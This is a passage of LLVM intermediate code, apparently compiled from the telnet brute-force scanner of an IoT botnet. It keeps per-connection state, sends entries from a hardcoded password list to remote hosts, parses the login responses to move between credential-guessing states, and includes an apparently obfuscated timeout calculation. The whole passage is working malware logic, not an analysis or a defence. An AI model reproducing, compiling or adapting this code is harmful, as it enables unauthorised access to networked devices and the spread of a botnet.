  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %597
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %598, i32 0, i32 0
  %600 = load i32, i32* %599, align 16
  %601 = call i32 @sclose(i32 %600)
  %602 = load i32, i32* %2, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %603
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %604, i32 0, i32 2
  store i8 0, i8* %605, align 8
  %606 = load i32, i32* %2, align 4
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %607
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %608, i32 0, i32 3
  store i8 1, i8* %609, align 1
  br label %1992

; <label>:610:                                    ; preds = %570
  %611 = load i32, i32* %2, align 4
  %612 = sext i32 %611 to i64
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %612
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %613, i32 0, i32 0
  %615 = load i32, i32* %614, align 16
  %616 = call i64 @send(i32 %615, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %617 = icmp slt i64 %616, 0
  br i1 %617, label %618, label %633

; <label>:618:                                    ; preds = %610
  %619 = load i32, i32* %2, align 4
  %620 = sext i32 %619 to i64
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %620
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %621, i32 0, i32 0
  %623 = load i32, i32* %622, align 16
  %624 = call i32 @sclose(i32 %623)
  %625 = load i32, i32* %2, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %626
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %627, i32 0, i32 2
  store i8 0, i8* %628, align 8
  %629 = load i32, i32* %2, align 4
  %630 = sext i32 %629 to i64
  %631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %630
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %631, i32 0, i32 3
  store i8 1, i8* %632, align 1
  br label %1992

; <label>:633:                                    ; preds = %610
  %634 = load i32, i32* %2, align 4
  %635 = sext i32 %634 to i64
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %635
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %636, i32 0, i32 2
  store i8 4, i8* %637, align 8
  br label %1991

; <label>:638:                                    ; preds = %72
  %639 = load i32, i32* %2, align 4
  %640 = sext i32 %639 to i64
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %640
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %641, i32 0, i32 6
  %643 = load i32, i32* %642, align 4
  %644 = icmp eq i32 %643, 0
  br i1 %644, label %645, label %651

; <label>:645:                                    ; preds = %638
  %646 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %647 = load i32, i32* %2, align 4
  %648 = sext i32 %647 to i64
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %648
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %649, i32 0, i32 6
  store i32 %646, i32* %650, align 4
  br label %651

; <label>:651:                                    ; preds = %645, %638
  %652 = load i32, i32* %2, align 4
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %653
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %654, i32 0, i32 0
  %656 = load i32, i32* %655, align 16
  %657 = load i32, i32* %2, align 4
  %658 = sext i32 %657 to i64
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %658
  %660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %659, i32 0, i32 8
  %661 = load i8*, i8** %660, align 8
  %662 = load i32, i32* %2, align 4
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %663
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %664, i32 0, i32 7
  %666 = load i16, i16* %665, align 16
  %667 = zext i16 %666 to i32
  %668 = call i32 @readUntil(i32 %656, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %661, i32 1024, i32 %667)
  %669 = icmp ne i32 %668, 0
  br i1 %669, label %670, label %702

; <label>:670:                                    ; preds = %651
  %671 = load i32, i32* %2, align 4
  %672 = sext i32 %671 to i64
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %672
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %673, i32 0, i32 6
  store i32 0, i32* %674, align 4
  %675 = load i32, i32* %2, align 4
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %676
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %677, i32 0, i32 7
  store i16 0, i16* %678, align 16
  %679 = load i32, i32* %2, align 4
  %680 = sext i32 %679 to i64
  %681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %680
  %682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %681, i32 0, i32 8
  %683 = load i8*, i8** %682, align 8
  %684 = call i8* @strstr(i8* %683, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0)) #10
  %685 = icmp ne i8* %684, null
  br i1 %685, label %686, label %691

; <label>:686:                                    ; preds = %670
  %687 = load i32, i32* %2, align 4
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %688
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %689, i32 0, i32 2
  store i8 5, i8* %690, align 8
  br label %696

; <label>:691:                                    ; preds = %670
  %692 = load i32, i32* %2, align 4
  %693 = sext i32 %692 to i64
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %693
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %694, i32 0, i32 2
  store i8 7, i8* %695, align 8
  br label %696

; <label>:696:                                    ; preds = %691, %686
  %697 = load i32, i32* %2, align 4
  %698 = sext i32 %697 to i64
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %698
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %699, i32 0, i32 8
  %701 = load i8*, i8** %700, align 8
  call void @llvm.memset.p0i8.i64(i8* %701, i8 0, i64 1024, i32 1, i1 false)
  br label %1992

; <label>:702:                                    ; preds = %651
  %703 = load i32, i32* %2, align 4
  %704 = sext i32 %703 to i64
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %704
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %705, i32 0, i32 0
  %707 = load i32, i32* %706, align 16
  %708 = load i32, i32* %2, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %709
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %710, i32 0, i32 8
  %712 = load i8*, i8** %711, align 8
  %713 = load i32, i32* %2, align 4
  %714 = sext i32 %713 to i64
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %714
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %715, i32 0, i32 7
  %717 = load i16, i16* %716, align 16
  %718 = zext i16 %717 to i32
  %719 = call i32 @readUntil(i32 %707, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %712, i32 1024, i32 %718)
  %720 = icmp ne i32 %719, 0
  br i1 %720, label %721, label %753

; <label>:721:                                    ; preds = %702
  %722 = load i32, i32* %2, align 4
  %723 = sext i32 %722 to i64
  %724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %723
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %724, i32 0, i32 6
  store i32 0, i32* %725, align 4
  %726 = load i32, i32* %2, align 4
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %727
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %728, i32 0, i32 7
  store i16 0, i16* %729, align 16
  %730 = load i32, i32* %2, align 4
  %731 = sext i32 %730 to i64
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %731
  %733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %732, i32 0, i32 8
  %734 = load i8*, i8** %733, align 8
  %735 = call i8* @strstr(i8* %734, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0)) #10
  %736 = icmp ne i8* %735, null
  br i1 %736, label %737, label %742

; <label>:737:                                    ; preds = %721
  %738 = load i32, i32* %2, align 4
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %739
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %740, i32 0, i32 2
  store i8 5, i8* %741, align 8
  br label %747

; <label>:742:                                    ; preds = %721
  %743 = load i32, i32* %2, align 4
  %744 = sext i32 %743 to i64
  %745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %744
  %746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %745, i32 0, i32 2
  store i8 7, i8* %746, align 8
  br label %747

; <label>:747:                                    ; preds = %742, %737
  %748 = load i32, i32* %2, align 4
  %749 = sext i32 %748 to i64
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %749
  %751 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %750, i32 0, i32 8
  %752 = load i8*, i8** %751, align 8
  call void @llvm.memset.p0i8.i64(i8* %752, i8 0, i64 1024, i32 1, i1 false)
  br label %1992

; <label>:753:                                    ; preds = %702
  %754 = load i32, i32* %2, align 4
  %755 = sext i32 %754 to i64
  %756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %755
  %757 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %756, i32 0, i32 8
  %758 = load i8*, i8** %757, align 8
  %759 = call i8* @strstr(i8* %758, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %760 = icmp ne i8* %759, null
  br i1 %760, label %761, label %776

; <label>:761:                                    ; preds = %753
  %762 = load i32, i32* %2, align 4
  %763 = sext i32 %762 to i64
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %763
  %765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %764, i32 0, i32 0
  %766 = load i32, i32* %765, align 16
  %767 = call i32 @sclose(i32 %766)
  %768 = load i32, i32* %2, align 4
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %769
  %771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %770, i32 0, i32 2
  store i8 0, i8* %771, align 8
  %772 = load i32, i32* %2, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %773
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %774, i32 0, i32 3
  store i8 0, i8* %775, align 1
  br label %1992

; <label>:776:                                    ; preds = %753
  %777 = load i32, i32* %2, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %778
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %779, i32 0, i32 8
  %781 = load i8*, i8** %780, align 8
  %782 = call i8* @strstr(i8* %781, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %783 = icmp ne i8* %782, null
  br i1 %783, label %784, label %799

; <label>:784:                                    ; preds = %776
  %785 = load i32, i32* %2, align 4
  %786 = sext i32 %785 to i64
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %786
  %788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %787, i32 0, i32 0
  %789 = load i32, i32* %788, align 16
  %790 = call i32 @sclose(i32 %789)
  %791 = load i32, i32* %2, align 4
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %792
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %793, i32 0, i32 2
  store i8 0, i8* %794, align 8
  %795 = load i32, i32* %2, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 3
  store i8 0, i8* %798, align 1
  br label %1992

; <label>:799:                                    ; preds = %776
  %800 = load i32, i32* %2, align 4
  %801 = sext i32 %800 to i64
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %801
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %802, i32 0, i32 8
  %804 = load i8*, i8** %803, align 8
  %805 = call i8* @strstr(i8* %804, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %806 = icmp ne i8* %805, null
  br i1 %806, label %807, label %822

; <label>:807:                                    ; preds = %799
  %808 = load i32, i32* %2, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %809
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %810, i32 0, i32 0
  %812 = load i32, i32* %811, align 16
  %813 = call i32 @sclose(i32 %812)
  %814 = load i32, i32* %2, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %815
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %816, i32 0, i32 2
  store i8 0, i8* %817, align 8
  %818 = load i32, i32* %2, align 4
  %819 = sext i32 %818 to i64
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %819
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %820, i32 0, i32 3
  store i8 0, i8* %821, align 1
  br label %1992

; <label>:822:                                    ; preds = %799
  %823 = load i32, i32* %2, align 4
  %824 = sext i32 %823 to i64
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %824
  %826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %825, i32 0, i32 8
  %827 = load i8*, i8** %826, align 8
  %828 = call i8* @strstr(i8* %827, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %829 = icmp ne i8* %828, null
  br i1 %829, label %830, label %845

; <label>:830:                                    ; preds = %822
  %831 = load i32, i32* %2, align 4
  %832 = sext i32 %831 to i64
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %832
  %834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %833, i32 0, i32 0
  %835 = load i32, i32* %834, align 16
  %836 = call i32 @sclose(i32 %835)
  %837 = load i32, i32* %2, align 4
  %838 = sext i32 %837 to i64
  %839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %838
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %839, i32 0, i32 2
  store i8 0, i8* %840, align 8
  %841 = load i32, i32* %2, align 4
  %842 = sext i32 %841 to i64
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %842
  %844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %843, i32 0, i32 3
  store i8 0, i8* %844, align 1
  br label %1992

; <label>:845:                                    ; preds = %822
  %846 = load i32, i32* %2, align 4
  %847 = sext i32 %846 to i64
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %847
  %849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %848, i32 0, i32 8
  %850 = load i8*, i8** %849, align 8
  %851 = call i8* @strstr(i8* %850, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0)) #10
  %852 = icmp ne i8* %851, null
  br i1 %852, label %853, label %868

; <label>:853:                                    ; preds = %845
  %854 = load i32, i32* %2, align 4
  %855 = sext i32 %854 to i64
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %855
  %857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %856, i32 0, i32 0
  %858 = load i32, i32* %857, align 16
  %859 = call i32 @sclose(i32 %858)
  %860 = load i32, i32* %2, align 4
  %861 = sext i32 %860 to i64
  %862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %861
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %862, i32 0, i32 2
  store i8 0, i8* %863, align 8
  %864 = load i32, i32* %2, align 4
  %865 = sext i32 %864 to i64
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %865
  %867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %866, i32 0, i32 3
  store i8 0, i8* %867, align 1
  br label %1992

; <label>:868:                                    ; preds = %845
  %869 = load i32, i32* %2, align 4
  %870 = sext i32 %869 to i64
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %870
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %871, i32 0, i32 8
  %873 = load i8*, i8** %872, align 8
  %874 = call i8* @strstr(i8* %873, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0)) #10
  %875 = icmp ne i8* %874, null
  br i1 %875, label %876, label %891

; <label>:876:                                    ; preds = %868
  %877 = load i32, i32* %2, align 4
  %878 = sext i32 %877 to i64
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %878
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %879, i32 0, i32 0
  %881 = load i32, i32* %880, align 16
  %882 = call i32 @sclose(i32 %881)
  %883 = load i32, i32* %2, align 4
  %884 = sext i32 %883 to i64
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %884
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %885, i32 0, i32 2
  store i8 0, i8* %886, align 8
  %887 = load i32, i32* %2, align 4
  %888 = sext i32 %887 to i64
  %889 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %888
  %890 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %889, i32 0, i32 3
  store i8 0, i8* %890, align 1
  br label %1992

; <label>:891:                                    ; preds = %868
  %892 = load i32, i32* %2, align 4
  %893 = sext i32 %892 to i64
  %894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %893
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %894, i32 0, i32 8
  %896 = load i8*, i8** %895, align 8
  %897 = call i8* @strstr(i8* %896, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %898 = icmp ne i8* %897, null
  br i1 %898, label %899, label %914

; <label>:899:                                    ; preds = %891
  %900 = load i32, i32* %2, align 4
  %901 = sext i32 %900 to i64
  %902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %901
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %902, i32 0, i32 0
  %904 = load i32, i32* %903, align 16
  %905 = call i32 @sclose(i32 %904)
  %906 = load i32, i32* %2, align 4
  %907 = sext i32 %906 to i64
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %907
  %909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %908, i32 0, i32 2
  store i8 0, i8* %909, align 8
  %910 = load i32, i32* %2, align 4
  %911 = sext i32 %910 to i64
  %912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %911
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %912, i32 0, i32 3
  store i8 0, i8* %913, align 1
  br label %1992

; <label>:914:                                    ; preds = %891
  %915 = load i32, i32* %2, align 4
  %916 = sext i32 %915 to i64
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %916
  %918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %917, i32 0, i32 8
  %919 = load i8*, i8** %918, align 8
  %920 = call i8* @strstr(i8* %919, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %921 = icmp ne i8* %920, null
  br i1 %921, label %922, label %937

; <label>:922:                                    ; preds = %914
  %923 = load i32, i32* %2, align 4
  %924 = sext i32 %923 to i64
  %925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %924
  %926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %925, i32 0, i32 0
  %927 = load i32, i32* %926, align 16
  %928 = call i32 @sclose(i32 %927)
  %929 = load i32, i32* %2, align 4
  %930 = sext i32 %929 to i64
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %930
  %932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %931, i32 0, i32 2
  store i8 0, i8* %932, align 8
  %933 = load i32, i32* %2, align 4
  %934 = sext i32 %933 to i64
  %935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %934
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %935, i32 0, i32 3
  store i8 0, i8* %936, align 1
  br label %1992

; <label>:937:                                    ; preds = %914
  br label %938

; <label>:938:                                    ; preds = %937
  br label %939

; <label>:939:                                    ; preds = %938
  br label %940

; <label>:940:                                    ; preds = %939
  br label %941

; <label>:941:                                    ; preds = %940
  br label %942

; <label>:942:                                    ; preds = %941
  br label %943

; <label>:943:                                    ; preds = %942
  br label %944

; <label>:944:                                    ; preds = %943
  %945 = load i32, i32* %2, align 4
  %946 = sext i32 %945 to i64
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %946
  %948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %947, i32 0, i32 8
  %949 = load i8*, i8** %948, align 8
  %950 = call i64 @strlen(i8* %949) #10
  %951 = trunc i64 %950 to i16
  %952 = load i32, i32* %2, align 4
  %953 = sext i32 %952 to i64
  %954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %953
  %955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %954, i32 0, i32 7
  store i16 %951, i16* %955, align 16
  br label %956

; <label>:956:                                    ; preds = %944
  br label %957

; <label>:957:                                    ; preds = %956
  %958 = load i32, i32* %2, align 4
  %959 = sext i32 %958 to i64
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %959
  %961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %960, i32 0, i32 6
  %962 = load i32, i32* %961, align 4
  %963 = add i32 %962, 1055019032
  %964 = add i32 %963, 10
  %965 = sub i32 %964, 1055019032
  %966 = add i32 %962, 10
  %967 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %968 = icmp ult i32 %965, %967
  br i1 %968, label %969, label %984

; <label>:969:                                    ; preds = %957
  %970 = load i32, i32* %2, align 4
  %971 = sext i32 %970 to i64
  %972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %971
  %973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %972, i32 0, i32 0
  %974 = load i32, i32* %973, align 16
  %975 = call i32 @sclose(i32 %974)
  %976 = load i32, i32* %2, align 4
  %977 = sext i32 %976 to i64
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %977
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %978, i32 0, i32 2
  store i8 0, i8* %979, align 8
  %980 = load i32, i32* %2, align 4
  %981 = sext i32 %980 to i64
  %982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %981
  %983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %982, i32 0, i32 3
  store i8 1, i8* %983, align 1
  br label %984

; <label>:984:                                    ; preds = %969, %957
  br label %1991

; <label>:985:                                    ; preds = %72
  %986 = load i32, i32* %2, align 4
  %987 = sext i32 %986 to i64
  %988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %987
  %989 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %988, i32 0, i32 0
  %990 = load i32, i32* %989, align 16
  %991 = load i32, i32* %2, align 4
  %992 = sext i32 %991 to i64
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %992
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %993, i32 0, i32 5
  %995 = load i8, i8* %994, align 1
  %996 = zext i8 %995 to i64
  %997 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %996
  %998 = load i8*, i8** %997, align 8
  %999 = load i32, i32* %2, align 4
  %1000 = sext i32 %999 to i64
  %1001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1000
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1001, i32 0, i32 5
  %1003 = load i8, i8* %1002, align 1
  %1004 = zext i8 %1003 to i64
  %1005 = getelementptr inbounds [18 x i8*], [18 x i8*]* @passwords, i64 0, i64 %1004
  %1006 = load i8*, i8** %1005, align 8
  %1007 = call i64 @strlen(i8* %1006) #10
  %1008 = call i64 @send(i32 %990, i8* %998, i64 %1007, i32 16384)
  %1009 = icmp slt i64 %1008, 0
  br i1 %1009, label %1010, label %1025

; <label>:1010:                                   ; preds = %985
  %1011 = load i32, i32* %2, align 4
  %1012 = sext i32 %1011 to i64
  %1013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1012
  %1014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1013, i32 0, i32 0
  %1015 = load i32, i32* %1014, align 16
  %1016 = call i32 @sclose(i32 %1015)
  %1017 = load i32, i32* %2, align 4
  %1018 = sext i32 %1017 to i64
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1018
  %1020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1019, i32 0, i32 2
  store i8 0, i8* %1020, align 8
  %1021 = load i32, i32* %2, align 4
  %1022 = sext i32 %1021 to i64
  %1023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1022
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1023, i32 0, i32 3
  store i8 1, i8* %1024, align 1
  br label %1992

; <label>:1025:                                   ; preds = %985
  %1026 = load i32, i32* %2, align 4
  %1027 = sext i32 %1026 to i64
  %1028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1027
  %1029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1028, i32 0, i32 0
  %1030 = load i32, i32* %1029, align 16
  %1031 = call i64 @send(i32 %1030, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %1032 = icmp slt i64 %1031, 0
  br i1 %1032, label %1033, label %1048

; <label>:1033:                                   ; preds = %1025
  %1034 = load i32, i32* %2, align 4
  %1035 = sext i32 %1034 to i64
  %1036 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1035
  %1037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1036, i32 0, i32 0
  %1038 = load i32, i32* %1037, align 16
  %1039 = call i32 @sclose(i32 %1038)
  %1040 = load i32, i32* %2, align 4
  %1041 = sext i32 %1040 to i64
  %1042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1041
  %1043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1042, i32 0, i32 2
  store i8 0, i8* %1043, align 8
  %1044 = load i32, i32* %2, align 4
  %1045 = sext i32 %1044 to i64
  %1046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1045
  %1047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1046, i32 0, i32 3
  store i8 1, i8* %1047, align 1
  br label %1992

; <label>:1048:                                   ; preds = %1025
  %1049 = load i32, i32* %2, align 4
  %1050 = sext i32 %1049 to i64
  %1051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1050
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1051, i32 0, i32 2
  store i8 6, i8* %1052, align 8
  br label %1991

; <label>:1053:                                   ; preds = %72
  %1054 = load i32, i32* %2, align 4
  %1055 = sext i32 %1054 to i64
  %1056 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1055
  %1057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1056, i32 0, i32 6
  %1058 = load i32, i32* %1057, align 4
  %1059 = icmp eq i32 %1058, 0
  br i1 %1059, label %1060, label %1066

; <label>:1060:                                   ; preds = %1053
